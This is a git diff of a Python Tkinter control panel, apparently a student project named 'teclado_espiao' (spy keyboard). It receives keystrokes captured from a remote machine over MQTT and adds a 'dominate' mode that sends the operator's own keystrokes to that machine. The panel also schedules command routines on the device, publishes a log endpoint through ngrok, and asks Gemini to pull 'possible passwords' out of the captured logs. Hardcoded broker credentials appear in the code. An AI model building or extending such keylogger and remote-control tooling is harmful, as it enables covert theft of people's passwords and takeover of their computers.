@@ -11,7 +11,6 @@ import ngrok
 import google.generativeai as genai
 import threading
 from tkinter import filedialog
-import sqlite3
 
 global Confirmar
 global mqtt_client
@@ -31,7 +30,7 @@ command_response_topic = "teclado_espiao/command_response"
 # COMANDOS
 def send_cmd(cmd, params):
     global mqtt_client
-    cmd_message = f"{cmd} [{','.join(params)}]"
+    cmd_message = f"{cmd} {' '.join(params)}"
 
     mqtt_client.publish(command_request_topic, cmd_message)
 
@@ -39,61 +38,45 @@ def cmd_schedule(routine_name, routine_cmd, date):
 
     send_cmd("SCHEDULE", [routine_name, date, routine_cmd])
 
-def cmd_routine(routine_name, routine_cmd):
+def cmd_routine(routine_cmd):
 
-    send_cmd("ROUTINE", [routine_name, routine_cmd])
+    send_cmd("ROUTINE", [routine_cmd])
 
 def cmd_sync_log():
     global log_api
 
-    send_cmd("SYNC_LOG", log_api)
+    send_cmd("SYNC_LOG", [log_api])
+
+def cmd_change_mode():
+
+    send_cmd("CHANGE_MODE", [])
 
 keyboards = {}
 
 def action_handler_factory(text_box, f_text_box):
-    def handle_action(action):
-        if action[1] == "PRESSED":
-            text_box.insert("end", str(action) + " ")
-        elif action[1] == "RELEASED":
-            text_box.insert("end", str(action) + " ")
+    def handle_action(action, formatted):
+        global Dom, mqtt_client
+        print(action)
+        text_box.config(state="normal")
+        f_text_box.config(state="normal")
 
-            letter = action[0]
-            
-            if letter == "SPACE":
-                letter = " "
-            if letter == "CONTROL":
-                letter = ""
+        action_mode = action[2].strip("'")
+        print("action_mode", action_mode)
+        if action_mode == "p":
+            print("formatted", formatted)
+            if formatted == None:
+                f_text_box.delete("end-2c", "end-1c")
+            else:
+                f_text_box.insert("end", formatted)
+        
+        text_box.insert("end", str(action) + " ")
+        text_box.config(state="disabled")
+        f_text_box.config(state="disabled")
 
-            f_text_box.insert("end", letter)
-        else:
-            print(f"ERROR {action}")
+        if Dom:
+            tecla_text = f"{action[1]} {action_mode};;"
+            mqtt_client.publish(teclas_in, tecla_text)
     return handle_action
-    
-def key_listener_factory(keyboard, text_box, f_text_box): 
-    def listener(msg):
-        msg = msg.payload.decode('utf-8')
-        msg = msg.strip("()")
-        msg = msg.replace(" ", "")
-        msg = msg.replace("'", "")
-        action = msg.split(",")
-        if action[1] == "PRESSED":
-            keyboard.highlight_key(action[0])
-            text_box.insert("end", str(action) + " ")
-        elif action[1] == "RELEASED":
-            keyboard.reset_key(action[0])
-            text_box.insert("end", str(action) + " ")
-
-            letter = action[0]
-            
-            if letter == "SPACE":
-                letter = " "
-            if letter == "CONTROL":
-                letter = ""
-
-            f_text_box.insert("end", letter)
-        else:
-            print(f"ERROR {action}")
-    return listener
 
 def confirm(text, text_Y, text_N):
     global Confirmar
@@ -217,7 +200,7 @@ def intro_Screen():
     
 def main_Screen():
 
-    global root, frames, routines, selected_routine, logs, logs_sorted, selected_log, Data_start, Data_finish, Search_word
+    global root, frames, routines, selected_routine, logs, logs_sorted, selected_log, temp, Data_start, Data_finish, Search_word
 
     temp = 0
 
@@ -247,19 +230,22 @@ def main_Screen():
 
     # The callback for when the client receives a CONNACK response from the server.
     def on_connect( client, userdata, flags, rc):
+        print("Connected with result code " + str(rc))
         # Subscribing in on_connect() means that if we lose the connection and
         # reconnect then subscriptions will be renewed.
-        client.subscribe(teclas_in)
+        client.subscribe(teclas_out)
 
         # The callback for when a PUBLISH message is received from the server.
     def on_message( client, userdata, msg):
         topic = str(msg.topic)
         message = str(msg.payload.decode("utf-8"))
+        print(topic + " " + message)
         if topic in topic_handlers:
             topic_handlers[topic](msg)
 
     def start_mqtt():
         global mqtt_client
+        print("starting mqtt...")
         mqtt_client = mqtt.Client()
         mqtt_client.tls_set(certifi.where())
         mqtt_client.username_pw_set(username="aula", password= "zowmad-tavQez")
@@ -287,6 +273,7 @@ def main_Screen():
 
         listener = ngrok.forward("localhost:8000")
 
+        print("LOG_API_URL", listener.url())
         log_api = listener.url()
     
     setup_api()
@@ -326,9 +313,6 @@ def main_Screen():
     imagem_down_path = hf.resource_path("resources/images/arrow_down.png")
     imagem_down = tk.PhotoImage(file=imagem_down_path)
 
-    imagem_sync_path = hf.resource_path("resources/images/sync_button.png")
-    imagem_sync = tk.PhotoImage(file=imagem_sync_path)
-
     #Logica de estados
     
     def paint_frames(color):
@@ -337,21 +321,31 @@ def main_Screen():
         for frame in frames:
             frames[frame].config(bg=color)
 
+    def dominate():
+        paint_frames('#502525')
+        rotinas_botoes.config(bg='#502525')
+        keyboards["Home"].bind_keys()
+        hf.on_Click_Dom_On()
+
+    def release():
+        paint_frames('#252525')
+        rotinas_botoes.config(bg='#252525')
+        keyboards["Home"].unbind_keys()
+        hf.on_Click_Dom_Off()
+
     def change_state():
         global Dom
         global Confirmar
         if Dom:
-            paint_frames('#252525')
-            rotinas_botoes.config(bg='#252525')
+            release()
             Dom = False
-            hf.on_Click_Dom_Off()
+            cmd_change_mode()
         else:
             confirm("Tem Certeza?","Sim","Não")
             if Confirmar:
-                paint_frames('#502525')
-                rotinas_botoes.config(bg='#502525')
+                dominate()
                 Dom = True
-                hf.on_Click_Dom_On()
+                cmd_change_mode()
         
     
     #Estilos dos Botões
@@ -401,8 +395,8 @@ def main_Screen():
     home_Principal_GUI_keyboardInput_format = tk.Frame(home_Principal, width=500, height=250, bd=1, relief="solid", bg="#242323")
     home_Principal_GUI_keyboardInput_format.place(x=0,y=0)
 
-    home_Principal_GUI_keyboardInput_dump = tk.Frame(home_Principal, width=300, height=250, bd=1, relief="solid", bg="#242323")
-    home_Principal_GUI_keyboardInput_dump.place(x=500,y=0)
+    home_Principal_GUI_keyboardInput_dump = tk.Frame(home_Principal, bd=1, relief="solid", bg="#242323")
+    home_Principal_GUI_keyboardInput_dump.place(x=500,y=0, width=300, height=250)
 
     home_Principal_GUI_keyboardInput_realTime = tk.Frame(home_Principal, width=800, height=250, bd=1, relief="solid", bg="#242323")
     home_Principal_GUI_keyboardInput_realTime.place(x=0,y=250)
@@ -416,9 +410,29 @@ def main_Screen():
     home_Principal_GUI_keyboardInput_dump_Text.config(state="normal")
 
     keyboards["Home"] = QWERTYKeyboard(root, home_Principal_GUI_keyboardInput_realTime,110, 20)
-    keyboards["Home"].set_mode("listen")
+    keyboards["Home"].set_mode("typing", action_handler_factory(home_Principal_GUI_keyboardInput_dump_Text, home_Principal_GUI_keyboardInput_format_Text))
 
-    set_topic_handler(teclas_in, key_listener_factory(keyboards["Home"], home_Principal_GUI_keyboardInput_dump_Text, home_Principal_GUI_keyboardInput_format_Text))
+    def label_received(msg):
+        msg = msg.payload.decode('utf-8')
+        if len(msg.strip(" ")) == 0:
+            return
+        print("KEY OUT: ", msg)
+        msg = msg.strip(";")
+        msg = msg.replace("'", "")
+
+        params = msg.split(" ")
+        label = params[0].upper()
+        action = params[1]
+
+        print("LABEL", label)
+        print("ACTION", action)
+
+        if action == "p":
+            keyboards["Home"].label_pressed(label)
+        else:
+            keyboards["Home"].label_released(label)
+
+    set_topic_handler(teclas_out, label_received)
 
     #Estilo das Rotinas
 
@@ -482,12 +496,14 @@ def main_Screen():
     def play_routine():
         global routines, selected_routine
 
+        print(selected_routine)
+
         if selected_routine == None:
             return
 
         routine = routines[selected_routine]
 
-        cmd_routine(selected_routine, routine["command"])
+        cmd_routine(routine["command"])
 
     play_routine_button = tk.Button(rotinas_botoes, text="Play", command=lambda: (hf.on_Click(), play_routine()), **button_Style_Sidebar)
     play_routine_button.place(x=0, y=180, width=300, height=70)
@@ -586,11 +602,11 @@ def main_Screen():
 
         texto_Formatado_Frame_Text = tk.Text(texto_Formatado_Frame, font=("Anonymous Pro", 11), bg="#242323", fg="white", highlightthickness=0, bd=0)
         texto_Formatado_Frame_Text.pack(fill="both",expand=True)
-        texto_Formatado_Frame_Text.config(state="normal")
+        texto_Formatado_Frame_Text.config(state="disabled")
 
         texto_Dump_Frame_Text = tk.Text(texto_Dump_Frame, font=("Anonymous Pro", 11), bg="#242323", fg="white", highlightthickness=0, bd=0)
         texto_Dump_Frame_Text.pack(fill="both",expand=True)
-        texto_Dump_Frame_Text.config(state="normal")
+        texto_Dump_Frame_Text.config(state="disabled")
 
         button = tk.Button(gravar, text="START", width = 10, height = 2, **button_Style)
         button.place(x=800, y=350, width = 300 , height = 150)
@@ -620,101 +636,93 @@ def main_Screen():
     # Agendamento de rotinas
 
     def open_schedule_popup(routine):
-        if routine is None:
-            janela_erro("Selecione uma rotina!")
-            return
+
+        def set_placeholder(entry, placeholder_text):
+            """
+            Adds placeholder text functionality to a Tkinter Entry widget.
+            """
+            entry.insert(0, placeholder_text)
+            entry.configure(fg="grey")
+
+            def on_focus_in(event):
+                if entry.get() == placeholder_text:
+                    entry.delete(0, tk.END)
+                    entry.configure(fg="white")
+
+            def on_focus_out(event):
+                if not entry.get():
+                    entry.insert(0, placeholder_text)
+                    entry.configure(fg="grey")
+
+            entry.bind("<FocusIn>", on_focus_in)
+            entry.bind("<FocusOut>", on_focus_out)
+
+        schedule_routine_popup = tk.Toplevel()
+        schedule_routine_popup.title(f"Agendar {routine}")
+        schedule_routine_popup.configure(bg='#2e2b2b')
+        schedule_routine_popup.resizable(False, False)
+        schedule_routine_popup.geometry("500x200")
+        
+        # Label and Entry for the first text input
+        data_label = tk.Label(schedule_routine_popup, text="Data: ", font=("Anonymous Pro", 16, "bold"), bg = "#252525", fg = "white")
+        data_label.place(x=50, y=20)
+        data_entry = tk.Entry(schedule_routine_popup, width=10, font=("Anonymous Pro", 16), bg="#242323", fg="white", highlightthickness=0, bd=1, relief = "solid")
+        data_entry.place(x=50, y=50)
+        set_placeholder(data_entry, "DD/MM/YYYY")
+
+        # Label and Entry for the second text input
+        time_label = tk.Label(schedule_routine_popup, text="Hora: ", font=("Anonymous Pro", 16, "bold"), bg = "#252525", fg = "white")
+        time_label.place(x=300, y=20)
+        time_entry = tk.Entry(schedule_routine_popup, width=10, font=("Anonymous Pro", 16), bg="#242323", fg="white", highlightthickness=0, bd=1, relief = "solid")
+        time_entry.place(x=300, y=50)
+        set_placeholder(time_entry, "hh/mm")
+
         def on_confirm():
             try:
-                diaS = dia.get()
-                mesS = mes.get()
-                anoS = "20" + ano.get()
-                horaS = hora.get()
-                minutoS = minuto.get()
-
-                secure_date = datetime.strptime(f"{diaS}/{mesS}/{anoS}", "%d/%m/%Y").strftime("%d/%m/%Y")
-                secure_time = datetime.strptime(f"{horaS}:{minutoS}", "%H:%M").strftime("%H:%M")
+                secure_date = datetime.strptime(data_entry.get(), "%d/%m/%Y").strftime("%y-%m-%d")
             except:
-                janela_erro("Inválido!")
-                agendarW.destroy()
+                print("DATA INVÁLIDA")
+                return
+            
+            try:
+                secure_time = datetime.strptime(time_entry.get(), "%H:%M").strftime("%H-%M")
+            except:
+                print("HORÁRIO INVÁLIDO")
                 return
 
-            cmd_schedule(routine, routines[routine]["command"], f"{secure_date} {secure_time}")
-            agendarW.destroy()
+            cmd_schedule(routine, routines[routine]["command"], f"{secure_date}_{secure_time}")
+            
+            schedule_routine_popup.destroy()
 
-        agendarW = tk.Toplevel()
-        agendarW.configure(bg='#3a3a3a')
-        agendarW.resizable(False, False)
-        agendarW.overrideredirect(True)
-        agendarW.pack_propagate(False)
-        agendarW.attributes("-topmost", True)
-        agendarW.grab_set()
-        hf.centralize_Window(agendarW,300,300)
+        
+        def on_cancel():
+            schedule_routine_popup.destroy()
 
-        hf.make_draggable(agendarW)
+        confirm_config = {
+        "font": ("Anonymous Pro", 16, "bold"),
+        "bg": "#4CAF50",
+        "fg": "white",
+        "bd": 0,
+        "activebackground": "#45A049",
+        "activeforeground": "white"
+        }
 
-        vcmd = (agendarW.register(hf.validate_input), '%d', '%P')
-
-        button_confirm = {
+        cancel_config = {
             "font": ("Anonymous Pro", 16, "bold"),
-            "bg": "#4CAF50",
+            "bg": "#a1392d",
             "fg": "white",
             "bd": 0,
-            "activebackground": "#45A049",
+            "activebackground": "#943a2f",
             "activeforeground": "white"
         }
 
-        entry_options = {
-        "validate": "key",
-        "validatecommand": vcmd,
-        "font": ("Arial", 16),
-        "justify": "center",
-        "bg": "#242323",              # Cor de fundo
-        "fg": "#ffffff",             # Cor do texto
-        "relief": "solid",           # Borda sólida
-        "highlightbackground": "#4CAF50",  # Cor da borda
-        "highlightthickness": 2      # Espessura da borda
-        }
+        # Cancel Button
+        cancel_button = tk.Button(schedule_routine_popup, text="Cancel", command=on_cancel, **cancel_config)
+        cancel_button.place(x=50, y=130)
 
-        texto_pos_data = tk.Frame(agendarW, bg="#3a3a3a")
-        texto_pos_data.place(x = 10, y = 10, width=290, height=20)
-
-        texto_data = tk.Label(texto_pos_data, text="Insira a data", font=("Anonymous Pro", 16, "bold"), bg = "#3a3a3a", fg = "white")
-        texto_data.pack(expand=True)
-
-        dia = tk.Entry(agendarW, **entry_options)
-        dia.place(x=70, y=50, width=40, height=40)
-
-        barrinha1_ini = tk.Label(agendarW, text="/", bg="#3a3a3a", fg="white", font=("Anonymous Pro", 24))
-        barrinha1_ini.place(x=120, y=50)
-
-        mes = tk.Entry(agendarW, **entry_options)
-        mes.place(x=140, y=50, width=40, height=40)
-
-        barrinha2_ini = tk.Label(agendarW, text="/", bg="#3a3a3a", fg="white", font=("Anonymous Pro", 24))
-        barrinha2_ini.place(x=190, y=50)
-
-        ano = tk.Entry(agendarW, **entry_options)
-        ano.place(x=210, y=50, width=40, height=40)
-
-        texto_pos_hora = tk.Frame(agendarW, bg="#3a3a3a")
-        texto_pos_hora.place(x = 10, y = 110, width=290, height=20)
-
-        texto_hora = tk.Label(texto_pos_hora, text="Insira a hora", font=("Anonymous Pro", 16, "bold"), bg = "#3a3a3a", fg = "white")
-        texto_hora.pack(expand=True)
-
-        hora = tk.Entry(agendarW, **entry_options)
-        hora.place(x=105, y=150, width=40, height=40)
-
-        barrinha1_fim = tk.Label(agendarW, text=":", bg="#3a3a3a", fg="white", font=("Anonymous Pro", 24))
-        barrinha1_fim.place(x=147, y=150)
-
-        minuto = tk.Entry(agendarW, **entry_options)
-        minuto.place(x=165, y=150, width=40, height=40)
-
-        button1 = tk.Button(agendarW, text="confirmar", command=lambda: (on_confirm()), **button_confirm)
-        button1.place(x=90,y=230, width = 120, height = 50)
-
-        agendarW.wait_window(agendarW)
+        # Confirm Button
+        confirm_button = tk.Button(schedule_routine_popup, text="Confirm", command=on_confirm, **confirm_config)
+        confirm_button.place(x=300, y=130)
 
     #Estilos dos Logs
 
@@ -744,9 +752,6 @@ def main_Screen():
 
     log_button_context_back = tk.Button(log_frame, image=imagem_up, borderwidth=0, highlightthickness=0, command=lambda: (hf.on_Click(), log_visual_text.go_back()), width = 10, height = 2, **button_Style_Sidebar)
     log_button_context_back.place(x=930,y=120,width=30,height=30)
-
-    log_button_Sync = tk.Button(log_frame, image=imagem_sync, borderwidth=0, highlightthickness=0, command=lambda: (hf.on_Click(),adicionar_log()), width = 10, height = 2, **button_Style_Sidebar)
-    log_button_Sync.place(x=500,y=550, width = 95, height=85)
 
     log_button_AI = tk.Button(log_frame, text="AI", borderwidth=0, highlightthickness=0, command=lambda: (run_contexto_AI()), width = 10, height = 2, **button_Style_Sidebar)
     log_button_AI.place(x = 605, y = 550, width=150,height=85)
@@ -780,9 +785,7 @@ def main_Screen():
         pergunta = "Eu tenho esse log aqui, me de tudo de importante sobre ele como pontos chaves (sempre de os pontos chaves), possiveis senhas e informaçoes importantes: "
         pergunta += selected_log[1]
         resposta = model.generate_content(pergunta).text
-        button_Style_Ai = {}
-        for key, value in button_Style_Sidebar.items():
-            button_Style_Ai[key] = value
+        button_Style_Ai = button_Style_Sidebar
         button_Style_Ai["bg"] = '#2478ff'
         button_Style_Ai["activebackground"] = '#1961d4'
         hf.response_sound()
@@ -837,20 +840,21 @@ def main_Screen():
         threading.Thread(target=contexto_AI).start()
 
     def adicionar_log():
-        try:
-            global logs
-            conn = sqlite3.connect('logs.db')
-            cursor = conn.cursor()
-            cursor.execute("SELECT date, file_content FROM log")
-            linhas = cursor.fetchall()
-            datas = [linha[0] for linha in linhas]
-            texto = [linha[1].decode('utf-8') for linha in linhas]
-            for (i,el) in enumerate(datas):
-                logs[datas[i]] = {"desc": texto[i]}
-            conn.close()
-            build_log_list(1)
-        except:
-            pass
+        
+        cmd_sync_log()
+        # try:
+        #     global logs, temp
+        #     with open("testinhoLog.txt", encoding="utf-8") as bd:
+        #         lines = bd.readlines()
+        #         try:
+        #             atual = lines[temp].strip().split("#")
+        #         except:
+        #             pass
+        #         temp+=1
+        #     logs[atual[0]] = {"desc": atual[1]}
+        #     build_log_list(1)
+        # except:
+        #     pass
 
     def build_log_list(case):
         def get_button_details_log(date, log):
@@ -883,7 +887,8 @@ def main_Screen():
         global logs, logs_sorted, Data_start, Data_finish
         logs_sorted = {}
         for chave, valor in logs.items():
-            ano, mes, dia = chave.split("-")
+            dia, mes, ano = chave.split("/")
+            ano = "20" + ano
             data = datetime.strptime(f"{dia}/{mes}/{ano}", "%d/%m/%Y")
             if data >= Data_start and data <= Data_finish:
                 logs_sorted[chave] = valor
@@ -895,6 +900,11 @@ def main_Screen():
 
         Data_start = datetime.min
         Data_finish = datetime.max
+
+        def validate_input(action, value_if_allowed):
+            if action == "1":
+                return value_if_allowed.isdigit() and len(value_if_allowed) <= 2
+            return True
         
         def validar_data(dia1,dia2,mes1,mes2,ano1,ano2):
             global Data_start
@@ -925,7 +935,7 @@ def main_Screen():
 
         hf.make_draggable(dataW)
 
-        vcmd = (dataW.register(hf.validate_input), '%d', '%P')
+        vcmd = (dataW.register(validate_input), '%d', '%P')
 
         button_confirm = {
             "font": ("Anonymous Pro", 16, "bold"),
@@ -957,14 +967,14 @@ def main_Screen():
         dia_ini = tk.Entry(dataW, **entry_options)
         dia_ini.place(x=70, y=50, width=40, height=40)
 
-        barrinha1_ini = tk.Label(dataW, text="/", bg="#3a3a3a", fg="white", font=("Anonymous Pro", 24))
-        barrinha1_ini.place(x=120, y=50)
+        barrinha1 = tk.Label(dataW, text="/", bg="#3a3a3a", fg="white", font=("Anonymous Pro", 24))
+        barrinha1.place(x=120, y=50)
 
         mes_ini = tk.Entry(dataW, **entry_options)
         mes_ini.place(x=140, y=50, width=40, height=40)
 
-        barrinha2_ini = tk.Label(dataW, text="/", bg="#3a3a3a", fg="white", font=("Anonymous Pro", 24))
-        barrinha2_ini.place(x=190, y=50)
+        barrinha2 = tk.Label(dataW, text="/", bg="#3a3a3a", fg="white", font=("Anonymous Pro", 24))
+        barrinha2.place(x=190, y=50)
 
         ano_ini = tk.Entry(dataW, **entry_options)
         ano_ini.place(x=210, y=50, width=40, height=40)
@@ -978,14 +988,14 @@ def main_Screen():
         dia_fim = tk.Entry(dataW, **entry_options)
         dia_fim.place(x=70, y=150, width=40, height=40)
 
-        barrinha1_fim = tk.Label(dataW, text="/", bg="#3a3a3a", fg="white", font=("Anonymous Pro", 24))
-        barrinha1_fim.place(x=120, y=150)
+        barrinha1 = tk.Label(dataW, text="/", bg="#3a3a3a", fg="white", font=("Anonymous Pro", 24))
+        barrinha1.place(x=120, y=150)
 
         mes_fim = tk.Entry(dataW, **entry_options)
         mes_fim.place(x=140, y=150, width=40, height=40)
 
-        barrinha2_fim = tk.Label(dataW, text="/", bg="#3a3a3a", fg="white", font=("Anonymous Pro", 24))
-        barrinha2_fim.place(x=190, y=150)
+        barrinha2 = tk.Label(dataW, text="/", bg="#3a3a3a", fg="white", font=("Anonymous Pro", 24))
+        barrinha2.place(x=190, y=150)
 
         ano_fim = tk.Entry(dataW, **entry_options)
         ano_fim.place(x=210, y=150, width=40, height=40)
@@ -1006,6 +1016,7 @@ def main_Screen():
         def confirm_text():
             global Search_word
             Search_word = texto.get()
+            print(Search_word)
             perform_search()
             searchW.destroy()
         searchW = tk.Toplevel()
@@ -1093,6 +1104,12 @@ def main_Screen():
     config_label_intro_checkbox = tk.Checkbutton(conf_frame, variable=pular_intro, bg="#252525",highlightthickness=0,activebackground="#252525",)
     config_label_intro_checkbox.place(x=235,y=255)
 
+    largura = config_label_intro.winfo_reqwidth()
+    altura = config_label_intro.winfo_reqheight()
+
+    print(largura)
+    print(altura)
+
     frames["Config"] = conf_frame
 
     #Botoes
@@ -1108,6 +1125,9 @@ def main_Screen():
 
     config_button = tk.Button(sidebar, text="Configurações", command=lambda: (hf.on_Click(), carrega_frame("Config")), **button_Style_Sidebar)
     config_button.pack(pady=10, padx=10, fill="x")
+
+    sync_button = tk.Button(sidebar, text="Sync test", command=lambda: (hf.on_Click(), adicionar_log()), **button_Style_Sidebar)
+    sync_button.pack(pady=10, padx=10, fill="x")
     
 
     buttons_sidebar = [
@@ -1135,6 +1155,15 @@ def main_Screen():
         widget.delete('1.0', tk.END)
         widget.insert(tk.END, contexto)
         widget.config(state="disabled")
+    
+    def teste():
+        global routines, selected_routine, logs, selected_log
+        for el in routines:
+            print(el)
+        print(selected_routine)
+        for el in logs:
+            print(el)
+        print(selected_log)
 
     carrega_frame("Home")
     try:
